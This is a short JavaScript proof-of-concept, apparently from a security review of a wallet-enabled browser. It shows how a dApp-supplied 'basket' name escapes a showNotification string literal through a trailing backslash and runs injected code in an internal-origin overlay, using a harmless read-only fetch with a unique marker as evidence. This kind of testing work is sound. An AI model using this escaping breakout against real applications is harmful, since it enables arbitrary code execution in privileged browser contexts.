// P0.5 panel #3 blocker — modal query-string JS injection at 127.0.0.1:5137.
//
// The dApp-controlled `basket` name flows verbatim into a showNotification('...')
// JS literal that escapes ONLY the ' character (not \). A trailing backslash
// turns the attacker's ' into an escaped-backslash + a real string terminator,
// breaking out into arbitrary JS that runs in the notification overlay — an
// IsInternalOrigin (127.0.0.1:5137) document.
//
// The basket string, built char-by-char to avoid its own escaping hazards, is:
//     backup-INJ \ ' ) ; fetch(`http://127.0.0.1:31401/wallet/status?<marker>`) ; //
// After the overlay's ' -> \' pass it becomes  INJ\');fetch(`...`);//
//   \  = one literal backslash inside the JS string
//   '   = closes the string literal
//   );  = closes showNotification(
//   fetch(...) executes  ;  // comments out the trailing else-branch
//
// EVIDENCE (single signal): the injected fetch hits a UNIQUE wallet URL. That
// URL can appear in the wallet log ONLY if the injected code ran inside the
// overlay, so the marker line IS the proof and it names the quantity under
// test — arbitrary code at an internal origin. /wallet/status is read-only.
(function () {
  var marker = 'MODALINJ_p3_' + Date.now();
  var bs = String.fromCharCode(92);   // backslash
  var q  = String.fromCharCode(39);   // single quote
  var bt = String.fromCharCode(96);   // backtick
  var url = 'http://127.0.0.1:31401/wallet/status?' + marker;
  var basket = 'backup-INJ' + bs + q + ');fetch(' + bt + url + bt + ')}' + '//';
  window.__hodos_walletCall(
    'listOutputs', '/listOutputs', { basket: basket, tags: [] }, 'POST');
  return JSON.stringify({ href: location.href, fired: true, marker: marker,
                          basket: basket });
})()
